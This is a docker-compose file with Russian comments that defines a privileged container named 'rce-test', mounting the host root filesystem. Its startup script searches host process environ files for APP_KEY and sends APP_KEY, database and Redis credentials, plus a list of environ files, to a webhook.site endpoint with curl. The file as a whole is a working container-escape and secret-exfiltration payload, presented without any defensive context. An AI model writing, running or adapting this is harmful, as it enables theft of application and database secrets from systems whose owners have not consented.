version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        
        # 1. Ищем PID через find + tr (Alpine-совместимо)
        find /host-root/proc -maxdepth 3 -name environ 2>/dev/null | while read f; do
          if tr '\0' '\n' < "$f" 2>/dev/null | grep -q "APP_KEY"; then
            echo "FOUND: $f" | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=found_environ
            tr '\0' '\n' < "$f" | grep -E "APP_KEY|DB_PASSWORD|DB_USERNAME|REDIS_PASSWORD" | curl -X POST --data-binary @- https://webhook.site/НОВЫЙ-URL?stage=secrets
          fi
        done
        
        # 2. Если ничего не нашли - отправляем список всех environ файлов для отладки
        find /host-root/proc -maxdepth 3 -name environ 2>/dev/null | head -20 | curl -X POST --data-binary @- https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=environ_list
        
        sleep 3600
